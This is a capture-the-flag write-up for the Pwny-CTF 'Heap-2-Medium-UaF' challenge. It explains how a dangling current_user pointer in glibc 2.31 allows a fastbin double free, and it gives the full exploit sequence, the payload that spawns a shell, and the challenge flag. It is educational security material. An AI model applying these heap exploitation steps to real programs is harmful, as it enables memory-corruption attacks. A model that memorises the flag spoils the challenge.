---
title: "Heap-2-Medium-UaF"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "medium"
points: 450
techniques: ["heap-use-after-free", "double-free", "tcache-poisoning"]
tools: ["netcat", "python"]
keywords: ["Heap-2-Medium-UaF", "Pwny-CTF", "pwn", "heap-use-after-free", "double-free", "tcache-poisoning", "netcat", "python", "libc", "uaf", "tcache", "heap"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/Heap-2-Medium-UaF/notes.md"
---

# Heap-2-Medium-UaF (Pwny-CTF, pwn)

## Summary
Challenge **Heap-2-Medium-UaF** from the Pwny-CTF CTF, pwn category. Main technique: heap-use-after-free. Recognize: a global pointer (current_user) left ghost after free + controllable objects of the same size = UAF. If a check prohibits the direct path, think about double free / aliasing to satisfy two conditions with a single chunk.

## Statement and artefacts
We finally fixed that nasty use after free bug. While we were at it, we made a few changes to the code. Now, the selected user object is tracked with a pointer to where that user was allocated, instead of by its user ID. (We figured one less level of indirection should make things quicker, right?)

Due to popular demand, we've also added the ability to delete the currently selected user. How convenient, right?

See if you can find a new UaF vulnerability in this program and exploit it. Shoutout to Justin for finding this unintended solution!

`nc chal.sigpwny.com 1361`

**Provided files / artifacts:**
- `work/heap2 (file, 32.2 KB)`
- `work/heap2_patched (file, 40.0 KB)`
- `work/ld-2.31.so (library, 187.0 KB)`
- `work/libc-2.31.so (library, 7.1 MB)`
- `work/libc.so.6 (file, 7.1 MB)`

## Recognition signals
- Signal: Recognize: a global pointer (current_user) left ghost after free + controllable objects of the same size = UAF. If a check prohibits the direct path, think about double free / aliasing to satisfy two conditions with a single chunk.
- Signal: fastbin vs tcache: fill_tcaches() + calloc (which skips the tcache) ⇒ everything is done in fastbin. Fastbin protection only looks at the top -> free(A); free(B); free(A) is enough to duplicate (no need to bypass the tcache key as in classic 2.31).
- Signal: glibc 2.31 trap: calloc is not used from the tcache, and as the tcache is full there is no "stashing" fastbin -> tcache -> the "fastbin = simple stack" model remains valid.

## Resolution method
1. **Vocabulary (read once)**

- **Chunk**: memory block rendered by `malloc`/`calloc`. Here each user or document = a chunk of 64 bytes of data.
- **UAF (Use-After-Free)**: use a pointer **after** its chunk has been freed (`free`). The `free` does not destroy anything, it just returns the block to the manager; if a pointer still targets it, we can read/write to it.
- **tcache**: small cache per size (glibc ≥ 2.26), **7 chunks max** per size, LIFO. Serves/yields very quickly.
- **fastbin**: another quick list by size, **LIFO** (stack), for small chunks. Protection: prohibited from freeing the chunk **already at the top** (error `double free or corruption (fasttop)`).
- **LIFO**: Last In First Out. The last one released is the first reallocated.
- **Double free**: free the same chunk twice. Allows you to highlight 2 allocation times → two different pointers on the **same** memory (aliasing).
- **Fastbin dup**: technique for doubling a chunk in the fastbin by bypassing the check `fasttop`: `free(A); free(B); free(A)` (another interspersed free).

---

2. **The program**

Multi-user terminal. Two structures of **same size** (64 B → `assert(sizeof(user)==sizeof(document))`):
```
user_t     { char name[60]; uint32_t logged_in; }   // 64 B
document_t { char text[64]; }                        // 64 B
```
- `users[32]`: array of **pointers** to users. `current_user`: **A pointer** to the selected user (new in Heap-2: it's a pointer, not an index).
- `users[0]` = "admin" (logged_in=0, inaccessible normally). Goal: make `current_user->name == "admin"`.
- Allocation by **`calloc`** (sets the chunk to zero). In glibc 2.31, `calloc` **does not use the cache**.
- At startup, `fill_tcaches()` allocates then frees 8 chunks of 64 B → **the 0x50 cache is full (7)**. So all our free/alloc of 64 B go through the **fastbin**.

3. **The anti-cheat change (vs Heap-1)**

`shell` now does **two** tests:
```c
if (!strncmp(current_user->name, "admin", 60)) {     // test 1: the name
    if (!is_user_in_table(current_user)) {            // test 2: is the pointer in users[]?
        printf("Currently selected user isn't in the table...");
        return;                                        // <- what was blocking at the beginning
    }
    system("/bin/sh");
}
```
And `del_user` / `del_selected` put back `users[i] = NULL`. So we can no longer leave a ghost pointer **in the table**. The only pointer never cleaned is **`current_user`** (after `del_selected`, it still points to the freed chunk): this is the repeatable free primitive.

---

4. **Why the simple UAF (Heap-1 shot) fails**

`del_selected` frees `current_user` **and** sets its table entry to NULL. By reoccupying the chunk with an "admin" document, we have `current_user->name=="admin"` but **no `users[i]` points to it** → test 2 fails:
```
users[2] = NULL (cleaned up by del_selected)
current_user ──► C["admin"]      (alone)
is_user_in_table(C) = FALSE -> refused
```
We must therefore **reconcile**: `current_user` AND a `users[i]` on the **same** chunk → this is the goal of the double free.

---

5. **Step A: make the double free (fastbin dup)**

Note `C` = chunk of `u2` (the one that `current_user` targets, never reassigned). `F` = residual chunk of `fill_tcaches`.
```
create_user u2/u3/u4   users[2]=C, users[3]=U3, users[4]=U4
switch_user 2          current_user ──► C

del_user 3     free(U3)   fastbin:  U3 -> F                 (top U3)
del_selected   free(C)    fastbin:  C -> U3 -> F            (top C)   users[2]=NULL ; current_user=C
del_user 4     free(U4)   fastbin:  U4 -> C -> U3 -> F      (top U4)   <-- INTERLEAVED
del_selected free(C) fastbin: C -> U4 -> C -> U3 -> F ✅ (top was U4 ≠ C, accepted)
```
Without the interspersed `del_user 4`, the 2nd `free(C)` would see `C` at the top → `fasttop` (this is the crash encountered). Here `C` is **twice** in the fastbin.

---

6. **Step B: reoccupy in the CORRECT order**

The fastbin is LIFO, each `calloc` pops the top:
```
order of allocations: C, U4, C, U3, F
                          #1   #2  #3
```
Constraints: **`C` must return to the table** (test 2) AND **"admin" must be the LAST write** on `C` (otherwise a `create_user` rewrites the name over it). Hence the winning order:
```
create_user u5   (#1 = C)  -> users[i] = C         // C COMES BACK INTO THE TABLE (name=u5, whatever)
create_user u6   (#2 = U4) -> users[j] = U4        // "trash" allocation that eats U4
create_doc       (#3 = C)  -> documents[0] = C     // we recover the 2nd copy of C
write_doc 0 "admin"+p32(1) -> C = {name:"admin", logged_in:1}   // FINAL write
```
Final state (two arrows on the same chunk):
```
        users[i] ─────────┐
                          ▼
                   C[ "admin" | 1 ]
                          ▲
   current_user ──────────┘ (never changed from the start)
```
`shell`:
```
test 1 : current_user->name == "admin"   ✅
test 2 : is_user_in_table(C) -> users[i]==C  ✅
=> system("/bin/sh")  ->  cat flag.txt
```

7. **Why the reversed order (your 1st try) failed**

`create_doc` first took `C` (#1) and `create_user` took `U4` (#2) → it was **`U4`** that ended up in the table, not `C`. So `is_user_in_table(C)` remained false.

---

8. **Final sequence (work/pwny.py)**

```
create_user u2 ; create_user u3 ; create_user u4 ; switch_user 2
del_user 3 ; del_selected ; del_user 4 ; del_selected        # fastbin dup from C
create_user u5 ; create_user u6                              # #1=C (table), #2=U4 (bin)
create_doc ; write_doc 0  b"admin"+b"\0"*55+p32(1)           # #3=C, name="admin"
shell
```
`write_doc` copies via `memcpy(..., arg1_len)` → null bytes and `\x01` pass (input read in binary), hence `logged_in=1` writes at offset 60 (useful for robustness, even if `shell` only tests the name).

---

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{UaF_in_the_d0cum3nt5_t4bl3??!!Wow_i_d1dnt_se3_that_0n3_c0m1ng!}

## Lessons and reusable patterns
- Recognize: a global pointer (current_user) left ghost after free + controllable objects of the same size = UAF. If a check prohibits the direct path, think about double free / aliasing to satisfy two conditions with a single chunk.
- fastbin vs tcache: fill_tcaches() + calloc (which skips the tcache) ⇒ everything is done in fastbin. Fastbin protection only looks at the top -> free(A); free(B); free(A) is enough to duplicate (no need to bypass the tcache key as in classic 2.31).
- LIFO order: with a fastbin C -> U4 -> C, the allocs output C, U4, C. Plan who (user vs doc) takes which copy, and do the useful writing last.
- glibc 2.31 trap: calloc is not used from the tcache, and as the tcache is full there is no "stashing" fastbin->tcache -> the "fastbin = simple stack" model remains valid.
- Always reread the final check: here two tests (name + is_user_in_table), the 2nd dictated the entire strategy.
- Progression of the series: Heap-0 (freed guard logged_in, direct switch) -> Heap-1 (logged_in=0 before free, rewrite via doc) -> Heap-2 (is_user_in_table -> double free obligatory).
